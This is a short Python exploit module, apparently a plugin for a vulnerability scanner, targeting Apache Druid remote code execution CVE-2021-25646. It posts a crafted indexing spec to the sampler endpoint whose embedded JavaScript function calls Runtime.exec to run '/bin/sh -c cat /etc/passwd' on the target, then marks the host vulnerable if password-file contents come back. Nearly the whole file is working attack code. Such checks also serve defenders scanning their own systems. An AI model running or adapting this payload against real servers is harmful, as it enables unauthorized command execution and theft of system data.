#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Druid RCE CVE-2021-25646',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/json'
      }
  target = '/druid/indexer/v1/sampler'
  data = '''
{
        "type":"index",
        "spec":{
           "ioConfig":{
              "type":"index",
              "firehose":{
                 "type":"local",
                 "baseDir":"/etc",
                 "filter":"passwd"
              }
           },
           "dataSchema":{
              "dataSource":"odgjxrrrePz",
              "parser":{
                 "parseSpec":{
                    "format":"javascript",
                    "timestampSpec":{

                    },
                    "dimensionsSpec":{

                    },
                    "function":"function(){var hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"/bin/sh`@~-c`@~cat /etc/passwd\".split(\"`@~\")).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"4137368\",OQtGXcxBVQVL: hTVCCerYZ}}",
                    "":{
                       "enabled":"true"
                    }
                 }
              }
           }
        },
        "samplerConfig":{
           "numRows":10
        }
        }
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "root:" in res.text and 'numRowsRead' in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret